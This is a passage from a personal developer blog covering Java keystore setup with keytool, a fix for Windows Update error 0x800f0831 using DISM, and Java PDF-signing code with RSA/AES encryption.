yyy.xxx@2017</span><br><span class="line"></span><br><span class="line">Generate trustedCertEntry (trust1)</span><br><span class="line">  #keytool -genkey -keystore xxx_egis.jks -keyalg RSA -keysize 2048 -validity 3650 -storepass yyy.xxx@2017</span><br><span class="line">  keytool -import -trustcacerts -v -alias trust1 -file iscca256.cer -keystore xxx_egis.jks -storepass yyy.xxx@2017</span><br><span class="line">  keytool -import -trustcacerts -v -alias rootca -file rootca256.cer -keystore xxx_egis.jks -storepass yyy.xxx@2017</span><br><span class="line">  #keytool -delete -alias mykey -keystore trust_store3.jks -storepass yyy.xxx@2017 // as xxx_egis is created and mykey does not exist</span><br><span class="line"></span><br><span class="line">Add below item as below in KMU</span><br><span class="line"> * key entry : friendly3</span><br><span class="line"> * cert entry : payment_signing</span><br><span class="line"> * cert entry : trust1</span><br><span class="line">Add passphase boci-key and ppsb-key with usage=paymentRecon</span><br></pre></td></tr></table></figure>
<h2 id="Keystore"><a href="#Keystore" class="headerlink" title="Keystore"></a>Keystore</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">D:\keystore\xxx_master.jks comes from rm2\keys\sit\xxx_master.jks</span><br><span class="line">D:\keystore\xxx_egis.jks comes from rm2\keys\sit\xxx_egis.jks</span><br></pre></td></tr></table></figure>
<h2 id="Install-unlimited-strength-JCE-policy-files-named-local-policy-jar-and-US-export-policy-jar-at-lib-security"><a href="#Install-unlimited-strength-JCE-policy-files-named-local-policy-jar-and-US-export-policy-jar-at-lib-security" class="headerlink" title="Install unlimited strength JCE policy files named local_policy.jar and US_export_policy.jar at \lib\security"></a>Install unlimited strength JCE policy files named local_policy.jar and US_export_policy.jar at <java-home>\lib\security</h2><h2 id="paymentclient-web-gt-IApp1-x2F-2-paymentrecon-portal-web-paymentrecon-dept-web-gt-GApp1-x2F-2"><a href="#paymentclient-web-gt-IApp1-x2F-2-paymentrecon-portal-web-paymentrecon-dept-web-gt-GApp1-x2F-2" class="headerlink" title="paymentclient_web -&gt; IApp1&#x2F;2, paymentrecon-portal_web, paymentrecon-dept_web -&gt; GApp1&#x2F;2"></a>paymentclient_web -&gt; IApp1&#x2F;2, paymentrecon-portal_web, paymentrecon-dept_web -&gt; GApp1&#x2F;2</h2><ol>
<li>JOB_RM_PAY_BACKGROUND_RECOVERY</li>
<li>JOB_RM_PAYRECON_PAYMENT_RECON_01_PPSB</li>
<li>JOB_RM_PAYRECON_PAYMENT_RECON_02_BOCI</li>
<li>JOB_RM_PAYRECON_PSDR_EXPORTER</li>
<li>JOB_RM_PAYRECON_PSDR_IMPORTER<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;jms-queue name=&quot;BackgroundRecoveryQueue&quot; entries=&quot;queue/BackgroundRecoveryQueue&quot;/&gt;</span><br><span class="line">&lt;jms-queue name=&quot;PSDRExporterScheduleJobQueue&quot; entries=&quot;queue/PSDRExporterScheduleJobQueue&quot;/&gt;</span><br><span class="line">&lt;jms-queue name=&quot;PSDRImporterScheduleJobQueue&quot; entries=&quot;queue/PSDRImporterScheduleJobQueue&quot;/&gt;</span><br><span class="line">&lt;jms-queue name=&quot;PaymentReconScheduleJobQueue&quot; entries=&quot;queue/PaymentReconScheduleJobQueue&quot;/&gt;</span><br></pre></td></tr></table></figure></li>
</ol>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-Fix-Problem-in-Windows-Update" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2019-05-07T07:56:39.000Z"><a href="/2019/05/07/Fix-Problem-in-Windows-Update/">2019-05-07</a></time>
      
      
  
    <h1 class="title"><a href="/2019/05/07/Fix-Problem-in-Windows-Update/">Fix Problem in Windows Update</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <h2 id="Encounter-error-code-0x800f0831-that-means-missing-some-security-patch-before-installing-current-windows-update"><a href="#Encounter-error-code-0x800f0831-that-means-missing-some-security-patch-before-installing-current-windows-update" class="headerlink" title="Encounter error code 0x800f0831, that means missing some security patch before installing current windows update."></a>Encounter error code 0x800f0831, that means missing some security patch before installing current windows update.</h2><p>check log file CBS.log in path C:\Windows\Logs\CBS, it is found there is missing package shown as below</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">2019-05-07 10:30:15, Info                  CBS    Store corruption, manifest missing for package: Package_1095_for_KB4093121~31bf3856ad364e35~amd64~~6.3.1.6</span><br><span class="line">2019-05-07 10:30:15, Error                 CBS    Failed to resolve package &#x27;Package_1095_for_KB4093121~31bf3856ad364e35~amd64~~6.3.1.6&#x27; [HRESULT = 0x800f0831 - CBS_E_STORE_CORRUPTION]</span><br><span class="line">2019-05-07 10:30:15, Info                  CBS    Mark store corruption flag because of package: Package_1095_for_KB4093121~31bf3856ad364e35~amd64~~6.3.1.6. [HRESULT = 0x800f0831 - CBS_E_STORE_CORRUPTION]</span><br><span class="line">2019-05-07 10:30:15, Info                  CBS    Failed to resolve package [HRESULT = 0x800f0831 - CBS_E_STORE_CORRUPTION]</span><br><span class="line">2019-05-07 10:30:15, Info                  CBS    Failed to get next package to re-evaluate [HRESULT = 0x800f0831 - CBS_E_STORE_CORRUPTION]</span><br><span class="line">2019-05-07 10:30:15, Info                  CBS    Failed to process component watch list. [HRESULT = 0x800f0831 - CBS_E_STORE_CORRUPTION]</span><br></pre></td></tr></table></figure>

<p>Then download the file KB4093121 from Windows Updates category website, and run following commands to re-install the security update</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">copy c:\Users\Administrator.TCSP\Downloads\windows8.1-kb4093121-x64_4e8483bcb4ad56a5b63959af8c3fc0dba9f93d48.msu c:\Windows\Temp</span><br><span class="line">cd c:\Windows\Temp</span><br><span class="line">expand windows8.1-kb4093121-x64_4e8483bcb4ad56a5b63959af8c3fc0dba9f93d48.msu -f:* .</span><br><span class="line">DISM.exe /Online /Add-Package /PackagePath:Windows8.1-kb4093121-x64.cab</span><br></pre></td></tr></table></figure>

<p>Also we can check log file at c:\Windows\Logs\DISM\dism.log</p>
<h2 id="To-repairing-system-and-servicing-health-by-running"><a href="#To-repairing-system-and-servicing-health-by-running" class="headerlink" title="To repairing system and servicing health by running"></a>To repairing system and servicing health by running</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">--&gt; sfc /scannow</span><br><span class="line">--&gt; dism.exe /online /cleanup-image /scanhealth</span><br><span class="line">--&gt; dism.exe /online /cleanup-image /restorehealth</span><br></pre></td></tr></table></figure>

<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a target="_blank" rel="noopener" href="http://mryoung.soundbomb.net/2017/12/12/windows-update-0x800f0831-cbs_e_store_corruption/">Fix 0x800F0831,CBS_E_STORE_CORRUPTION, this is the solution</a><br><a target="_blank" rel="noopener" href="https://blogs.technet.microsoft.com/mu/2016/11/23/how-to-list-updates-that-have-been-installed-on-your-windows-server-2016-machine/">List installed windows updates, by powershell or command</a><br><a target="_blank" rel="noopener" href="https://www.sysnative.com/forums/threads/server2012r2-datacenter-code-800f0831-kb2973351.23888/">https://www.sysnative.com/forums/threads/server2012r2-datacenter-code-800f0831-kb2973351.23888/</a><br><a target="_blank" rel="noopener" href="https://social.technet.microsoft.com/wiki/contents/articles/37901.windows-updates-failed-to-install-with-error-code-800f0831-in-windows-server-2012-r2.aspx">Windows updates failed to install with error code : 800F0831 in Windows Server 2012 R2</a><br><a target="_blank" rel="noopener" href="https://www.catalog.update.microsoft.com/Search.aspx?q=KB4093121">Windows Update Catalog, download KB from here</a></p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-PDF_Signing_By_p12_With_JS" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2019-01-23T08:20:53.000Z"><a href="/2019/01/23/PDF_Signing_By_p12_With_JS/">2019-01-23</a></time>
      
      
  
    <h1 class="title"><a href="/2019/01/23/PDF_Signing_By_p12_With_JS/">PDF Signing By p12 With JS</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <h2 id="DocSignController-java"><a href="#DocSignController-java" class="headerlink" title="DocSignController.java"></a>DocSignController.java</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br></pre></td><td class="code"><pre><span class="line">@GetMapping(&quot;/doc-sign/sign&quot;)</span><br><span class="line">public ResponseEntity&lt;Resource&gt; getHashForSign() throws IOException &#123;</span><br><span class="line">    log.debug(&quot;start to generate merged PDF in java web start program&quot;);</span><br><span class="line">    synchronized (eventPublisher) &#123;</span><br><span class="line">        eventPublisher.publishEvent(new OnDocMergeEvent(getUserId(), getXxxFormMaster().getXxxFormMasterId(), getXxxFormMaster().getFormType()));</span><br><span class="line">    &#125;</span><br><span class="line">    Integer xxxFormMasterId = getXxxFormMaster().getXxxFormMasterId();</span><br><span class="line">    String userId = getUserId();</span><br><span class="line"></span><br><span class="line">    List&lt;SuppDoc&gt; suppDocs = suppDocMapper.selectSuppDocByXxxFormMasterIdAndDocTypeAndUserId(xxxFormMasterId, userId, Constants.SUPP_DOC_TYPE_SYS_GEN_MERGE);</span><br><span class="line">    if (suppDocs == null || suppDocs.isEmpty()) &#123;</span><br><span class="line">        suppDocs = suppDocMapper.selectSuppDocByXxxFormMasterIdAndDocTypeAndUserId(xxxFormMasterId, userId, Constants.SUPP_DOC_TYPE_SYS_SIGN);</span><br><span class="line">        if (suppDocs != null &amp;&amp; !suppDocs.isEmpty()) &#123;</span><br><span class="line">            log.info(&quot;signed doc exists !!&quot;);</span><br><span class="line">            return ResponseEntity.status(HttpStatus.NOT_ACCEPTABLE).body(null);</span><br><span class="line">        &#125;</span><br><span class="line">        return ResponseEntity.status(HttpStatus.NOT_FOUND).body(null);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    SuppDoc suppDoc = suppDocs.get(0);</span><br><span class="line">    Integer suppDocId = suppDoc.getSuppDocId();</span><br><span class="line"></span><br><span class="line">    Resource pdfFile = storageService.loadAsResource(xxxFormMasterId, suppDocId);</span><br><span class="line"></span><br><span class="line">    File tempPdfFile = File.createTempFile(&quot;tmp&quot;, &quot;.pdf&quot;);</span><br><span class="line">    log.debug(&quot;Prepare pdf file for sign: &#123;&#125;&quot;, tempPdfFile.getPath());</span><br><span class="line"></span><br><span class="line">    log.info(&quot;get hash for sign, userId &#123;&#125; form master id &#123;&#125;&quot;, userId, xxxFormMasterId);</span><br><span class="line"></span><br><span class="line">    InputStream is = null;</span><br><span class="line">    try &#123;</span><br><span class="line">        is = emptySignature(pdfFile.getInputStream(), tempPdfFile);</span><br><span class="line">    &#125; catch (DocumentException | GeneralSecurityException e) &#123;</span><br><span class="line">        log.error(&quot;error occurrs on calculate signature&quot;, e);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    byte[] encryptedEmptySig = encrypt(StreamUtils.copyToByteArray(is));</span><br><span class="line">    //byte[] emptySig = StreamUtils.copyToByteArray(is);</span><br><span class="line">    String emptySig = Base64.getEncoder().encodeToString(encryptedEmptySig);</span><br><span class="line"></span><br><span class="line">    ByteArrayResource resource = new ByteArrayResource(emptySig.getBytes(StandardCharsets.ISO_8859_1));</span><br><span class="line"></span><br><span class="line">    HttpHeaders headers = new HttpHeaders();</span><br><span class="line">    headers.add(&quot;Cache-Control&quot;, &quot;no-cache, no-store, must-revalidate&quot;);</span><br><span class="line">    headers.add(&quot;Pragma&quot;, &quot;no-cache&quot;);</span><br><span class="line">    headers.add(&quot;Expires&quot;, &quot;0&quot;);</span><br><span class="line"></span><br><span class="line">    request.getSession(false).setAttribute(TEMP_SIGN_PATH, tempPdfFile.getPath());</span><br><span class="line"></span><br><span class="line">    return ResponseEntity.ok()</span><br><span class="line">            .headers(headers)</span><br><span class="line">            .contentLength(resource.contentLength())</span><br><span class="line">            .contentType(MediaType.TEXT_PLAIN)</span><br><span class="line">            .body(resource);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">private byte[] encrypt(byte[] emptySig) &#123;</span><br><span class="line">    /*try &#123;</span><br><span class="line">        log.debug(&quot;js debugging for signing with forge&quot;)</span><br><span class="line">        log.debug(&quot;HexBin.encode(emptySig) &quot; + HexBin.encode(emptySig).substring(0, 500));</span><br><span class="line">        MessageDigest messageDigest = MessageDigest.getInstance(&quot;SHA-256&quot;);</span><br><span class="line">        byte hash[] = messageDigest.digest(emptySig);</span><br><span class="line">        System.out.println(&quot;server emptySig sha256 hash = &quot; + Hex.toHexString(hash));</span><br><span class="line">    &#125; catch (NoSuchAlgorithmException e1) &#123;</span><br><span class="line">    &#125;*/</span><br><span class="line"></span><br><span class="line">    String type = &quot;X.509&quot;;</span><br><span class="line"></span><br><span class="line">    String encodedCertificate = request.getParameter(&quot;certificate&quot;);</span><br><span class="line">    try &#123;</span><br><span class="line">        CertificateFactory certificateFactory = CertificateFactory.getInstance(type);</span><br><span class="line">        Certificate certificate = certificateFactory.generateCertificate(</span><br><span class="line">                new ByteArrayInputStream(HashUtils.base64Decode(encodedCertificate)));</span><br><span class="line">        PublicKey publicKey = certificate.getPublicKey();</span><br><span class="line"></span><br><span class="line">        Cipher rsaCipher;</span><br><span class="line">        try &#123;</span><br><span class="line">            rsaCipher = Cipher.getInstance(RSA_ALGORITHM);</span><br><span class="line">            rsaCipher.init(Cipher.ENCRYPT_MODE, publicKey);</span><br><span class="line"></span><br><span class="line">            // reference from https://stackoverflow.com/questions/24338108/java-encrypt-string-with-existing-public-key-file</span><br><span class="line">            // Now create a new 256 bit Rijndael key to encrypt the file itself.</span><br><span class="line">            // This will be the session key.</span><br><span class="line">            /*KeyGenerator rijndaelKeyGenerator = KeyGenerator.getInstance(&quot;Rijndael&quot;);</span><br><span class="line">            rijndaelKeyGenerator.init(256);</span><br><span class="line">            log.debug(&quot;Generating session key...&quot;);</span><br><span class="line">            Key rijndaelKey = rijndaelKeyGenerator.generateKey();</span><br><span class="line">            log.debug(&quot;Done generating key.&quot;);</span><br><span class="line">            </span><br><span class="line">            byte[] encodedKeyBytes = rsaCipher.doFinal(rijndaelKey.getEncoded());</span><br><span class="line">            ByteArrayOutputStream output = new ByteArrayOutputStream();</span><br><span class="line">            output.write(encodedKeyBytes.length);</span><br><span class="line">            output.write(encodedKeyBytes);</span><br><span class="line">            </span><br><span class="line">            // Now we need an Initialization Vector for the symmetric cipher in CBC mode</span><br><span class="line">            SecureRandom random = new SecureRandom();</span><br><span class="line">            byte[] iv = new byte[16];</span><br><span class="line">            random.nextBytes(iv);</span><br><span class="line">            </span><br><span class="line">            output.write(iv);</span><br><span class="line">            </span><br><span class="line">            IvParameterSpec spec = new IvParameterSpec(iv);</span><br><span class="line">            // Create the cipher for encrypting the file itself.</span><br><span class="line">            Cipher symmetricCipher = Cipher.getInstance(RIJNDAEL_ALGORITHM);</span><br><span class="line">            symmetricCipher.init(Cipher.ENCRYPT_MODE, rijndaelKey, spec);</span><br><span class="line">            */</span><br><span class="line"></span><br><span class="line">            ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class="line">            DataOutputStream output = new DataOutputStream(baos);</span><br><span class="line"></span><br><span class="line">            KeyGenerator generator = KeyGenerator.getInstance(&quot;AES&quot;);</span><br><span class="line">            generator.init(128);</span><br><span class="line">            log.debug(&quot;Generating session key...&quot;);</span><br><span class="line">            SecretKey aesKey = generator.generateKey();</span><br><span class="line">            log.debug(&quot;Done generating key.&quot;);</span><br><span class="line"></span><br><span class="line">            log.debug(&quot;aesKey.getEncoded() = &quot; + Base64.getEncoder().encodeToString(aesKey.getEncoded()));</span><br><span class="line">            byte[] encodedKeyBytes = rsaCipher.doFinal(aesKey.getEncoded());</span><br><span class="line"></span><br><span class="line">            // output = encrypted AES key length + encrypted AES key + empty signature encrypted by AES key</span><br><span class="line">            log.debug(&quot;encrypted AES key length = &quot; + encodedKeyBytes.length);</span><br><span class="line">            output.writeInt(encodedKeyBytes.length);</span><br><span class="line">            output.write(encodedKeyBytes);</span><br><span class="line"></span><br><span class="line">            Cipher symmetricCipher = Cipher.getInstance(AES_ALGORITHM);</span><br><span class="line">            symmetricCipher.init(Cipher.ENCRYPT_MODE, aesKey);</span><br><span class="line"></span><br><span class="line">            output.write(symmetricCipher.doFinal(emptySig));</span><br><span class="line">            output.flush();</span><br><span class="line"></span><br><span class="line">            log.debug(&quot;length of encrypted data = &quot; + baos.toByteArray().length);</span><br><span class="line">            return baos.toByteArray();</span><br><span class="line">        &#125; catch (NoSuchAlgorithmException | NoSuchPaddingException | InvalidKeyException</span><br><span class="line">                | IllegalBlockSizeException | BadPaddingException | IOException e) &#123;</span><br><span class="line">            log.error(&quot;encrypt empty signature&quot;, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; catch (CertificateException e) &#123;</span><br><span class="line">        log.error(&quot;encrypt&quot;, e);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return null;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">private InputStream emptySignature(InputStream src, File dest)</span><br><span class="line">        throws IOException, DocumentException, GeneralSecurityException &#123;</span><br><span class="line">    PdfReader reader = new PdfReader(src);</span><br><span class="line">    FileOutputStream os = new FileOutputStream(dest);</span><br><span class="line">    PdfStamper stamper = PdfStamper.createSignature(reader, os, &#x27;\0&#x27;);</span><br><span class="line">    PdfSignatureAppearance appearance = stamper.getSignatureAppearance();</span><br><span class="line"></span><br><span class="line">    //appearance.setVisibleSignature(new Rectangle(0, 0, 0, 0), 1, FIELD_NAME);</span><br><span class="line">    log.info(&quot;create empty signature&quot;);</span><br><span class="line">    String position = (String) WebUtils.getSession().getAttribute(WebAttributeNames.SESSION_TCSP_DOC_SIGNATURE_POSITION);</span><br><span class="line">    String[] p = position.split(&quot;\\|&quot;);</span><br><span class="line">    appearance.setVisibleSignature(new Rectangle(Float.valueOf(p[0]), Float.valueOf(p[1]), Float.valueOf(p[2]), Float.valueOf(p[3])), Integer.valueOf(p[4]), Constants.SIG_FIELD_NAME);</span><br><span class="line"></span><br><span class="line">    // set signature text</span><br><span class="line">    Font font = new Font(FontFamily.TIMES_ROMAN, 10, Font.BOLD);</span><br><span class="line">    appearance.setLayer2Font(font);</span><br><span class="line">    appearance.setRunDirection(PdfWriter.RUN_DIRECTION_RTL);</span><br><span class="line"></span><br><span class="line">    appearance.setLayer2Text(&quot;Signed By Digital Certificate&quot;);</span><br><span class="line"></span><br><span class="line">    ClassPathResource pinImage = new ClassPathResource(&quot;static/images/Cert-sign.png&quot;);</span><br><span class="line">    appearance.setImage(Image.getInstance(pinImage.getURL()));</span><br><span class="line"></span><br><span class="line">    //appearance.setCertificate(chain[0]);</span><br><span class="line">    ExternalSignatureContainer external = new ExternalBlankSignatureContainer(PdfName.ADOBE_PPKLITE,</span><br><span class="line">            PdfName.ADBE_PKCS7_DETACHED);</span><br><span class="line">    MakeSignature.signExternalContainer(appearance, external, 8192);</span><br><span class="line">    os.close();</span><br><span class="line">    return appearance.getRangeStream();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@PostMapping(value = &quot;/doc-sign/sign&quot;, produces = MediaType.APPLICATION_JSON_VALUE)</span><br><span class="line">@ResponseBody</span><br><span class="line">public CertSignResult attachSignedHash() &#123;</span><br><span class="line">    CertSignResult certSignResult = new CertSignResult();</span><br><span class="line">    certSignResult.setStatus(CertSignResult.STATUS_NOT_SIGNED);</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">        if (!WebUtils.validateCert(pkiClient)) &#123;</span><br><span class="line">            return certSignResult;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line">        log.error(&quot;signHash&quot;, e);</span><br><span class="line">        return certSignResult;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    String tempPath = (String) request.getSession(false).getAttribute(TEMP_SIGN_PATH);</span><br><span class="line"></span><br><span class="line">    Integer xxxFormMasterId = getXxxFormMaster().getXxxFormMasterId();</span><br><span class="line">    String userId = getUserId();</span><br><span class="line"></span><br><span class="line">    log.info(&quot;sign hash, userId &#123;&#125; form master id &#123;&#125;&quot;, userId, xxxFormMasterId);</span><br><span class="line"></span><br><span class="line">    //		tryToDeleteSignedDoc();</span><br><span class="line"></span><br><span class="line">    File tempSignedFile = null;</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">        tempSignedFile = File.createTempFile(&quot;signed-&quot; + xxxFormMasterId + &quot;-&quot;, &quot;.pdf&quot;);</span><br><span class="line"></span><br><span class="line">        String hash = request.getParameter(&quot;signed&quot;);</span><br><span class="line">        //log.debug(&quot;hash &#123;&#125;&quot;, hash);</span><br><span class="line">        // Save the hash to file pkcs7-hash.pem</span><br><span class="line">        // View p7 file content by: openssl asn1parse -inform pem -in pkcs7-hash.pem</span><br><span class="line"></span><br><span class="line">        byte[] signedhash = Base64.getDecoder().decode(hash);</span><br><span class="line"></span><br><span class="line">        createSignature(tempPath, tempSignedFile, signedhash);</span><br><span class="line">    &#125; catch (DocumentException | GeneralSecurityException | IOException e) &#123;</span><br><span class="line">        log.error(&quot;Fail to sign document &quot; + e);</span><br><span class="line">        return certSignResult;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    SimpleSuppDoc doc = new SimpleSuppDoc();</span><br><span class="line">    doc.setXxxFormMasterId(xxxFormMasterId);</span><br><span class="line">    doc.setLocalFile(tempSignedFile);</span><br><span class="line">    doc.setSuppDocType(Constants.SUPP_DOC_TYPE_SYS_SIGN);</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">        Integer suppDocId = storageService.store(doc, userId);</span><br><span class="line"></span><br><span class="line">        if (doc.isUploadSucess()) &#123;</span><br><span class="line">            insertSigningLog(userId, xxxFormMasterId, suppDocId);</span><br><span class="line"></span><br><span class="line">            // no need to keep the merged doc</span><br><span class="line">            storageService.deleteDocByUserIdAndType(xxxFormMasterId, userId, Constants.SUPP_DOC_TYPE_SYS_GEN_MERGE);</span><br><span class="line"></span><br><span class="line">            certSignResult.setStatus(CertSignResult.STATUS_SIGNED);</span><br><span class="line">            request.getSession(false).setAttribute(WebAttributeNames.SESSION_TCSP_DOC_SIGN_STATUS, certSignResult);</span><br><span class="line"></span><br><span class="line">            createZipFileForSignedDoc(userId, tempSignedFile);</span><br><span class="line">            return certSignResult;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; catch (IOException e) &#123;</span><br><span class="line">        log.error(&quot;sign pdf file&quot;, e);</span><br><span class="line">    &#125; finally &#123;</span><br><span class="line">        if (tempSignedFile != null)</span><br><span class="line">            tempSignedFile.delete();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return certSignResult;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">private void createSignature(String src, File dest, byte[] signedHash)</span><br><span class="line">        throws IOException, DocumentException, GeneralSecurityException &#123;</span><br><span class="line">    PdfReader reader = new PdfReader(src);</span><br><span class="line">    FileOutputStream os = new 